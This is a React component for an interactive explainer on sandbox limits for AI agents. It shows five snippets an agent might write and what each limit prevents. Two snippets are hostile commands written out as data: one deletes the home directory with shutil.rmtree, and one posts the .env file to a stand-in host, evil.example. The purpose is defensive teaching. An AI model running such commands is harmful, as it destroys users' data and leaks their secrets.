"use client";

import { useState } from "react";

/*
  SandboxLimits — five snippets an agent might write. Flip sandbox limits
  on and off and see what each one does.
*/

const LIMITS = [
  { key: "fs", label: "Isolated filesystem" },
  { key: "net", label: "No network" },
  { key: "cpu", label: "CPU / time limit" },
  { key: "mem", label: "Memory limit" },
  { key: "env", label: "No secrets in env" },
] as const;
type K = (typeof LIMITS)[number]["key"];

const SNIPPETS: { name: string; code: string; needs: K[]; bad: string; good: string }[] = [
  { name: "Sum a column", code: "print(sum(row['total'] for row in rows))", needs: [], bad: "", good: "Does exactly what it says. No limit needed." },
  { name: "Tidy up files", code: "shutil.rmtree(os.path.expanduser('~'))", needs: ["fs"], bad: "Deletes the home directory of whoever runs it. If that is your server, it is your server.", good: "Only a throwaway scratch folder exists. It deletes that and nothing else." },
  { name: "Phone home", code: "requests.post('https://evil.example', data=open('.env').read())", needs: ["net", "fs", "env"], bad: "Sends your .env file to a stranger.", good: "No network, no real files, no secrets. The call fails and there was nothing to send." },
  { name: "Infinite loop", code: "while True: pass", needs: ["cpu"], bad: "Pins a CPU core forever and the run never returns. You pay for the wait.", good: "Killed after the time limit. The agent gets 'timed out' and can try something else." },
  { name: "Memory hog", code: "x = [0] * 10**11", needs: ["mem"], bad: "Eats RAM until the machine slows to a crawl or the process gets killed.", good: "Killed at the memory cap. Only the sandbox suffers." },
];

export function SandboxLimits() {
  const [on, setOn] = useState<Record<K, boolean>>({ fs: false, net: false, cpu: false, mem: false, env: false });

  return (
    <figure className="not-prose my-8 rounded-2xl border border-zinc-200 dark:border-zinc-800 bg-gradient-to-b from-zinc-50 to-white dark:from-zinc-900/60 dark:to-zinc-950 overflow-hidden">
      <div className="border-b border-zinc-200 dark:border-zinc-800 px-4 py-2.5 text-xs font-semibold text-zinc-500 dark:text-zinc-400">
        Five things an agent might write. Switch the limits on.
      </div>
      <div className="p-4 sm:p-5">
        <div className="flex flex-wrap gap-1.5">
          {LIMITS.map((l) => (
            <button key={l.key} onClick={() => setOn({ ...on, [l.key]: !on[l.key] })} className={`rounded-full border px-2.5 py-1 text-[11px] ${on[l.key] ? "border-emerald-500 bg-emerald-500/10 text-emerald-700 dark:text-emerald-300" : "border-zinc-200 dark:border-zinc-700 text-zinc-500 dark:text-zinc-400"}`}>
              {on[l.key] ? "✓ " : ""}{l.label}
            </button>
          ))}
        </div>
        <ul className="mt-4 space-y-2">
          {SNIPPETS.map((s) => {
            const safe = s.needs.every((k) => on[k]);
            return (
              <li key={s.name} className={`rounded-xl border p-3 ${safe ? "border-emerald-500/40 bg-emerald-500/5" : "border-rose-500/50 bg-rose-500/10"}`}>
                <p className="text-[12px] font-semibold text-zinc-800 dark:text-zinc-100">{s.name}</p>
                <code className="mt-1 block overflow-x-auto rounded bg-zinc-900 px-2 py-1 text-[11px] text-zinc-100">{s.code}</code>
                <p className="mt-1.5 text-[12px] text-zinc-600 dark:text-zinc-300">{safe ? "🛡 " + s.good : "💥 " + s.bad}</p>
              </li>
            );
          })}
        </ul>
      </div>
    </figure>
  );
}
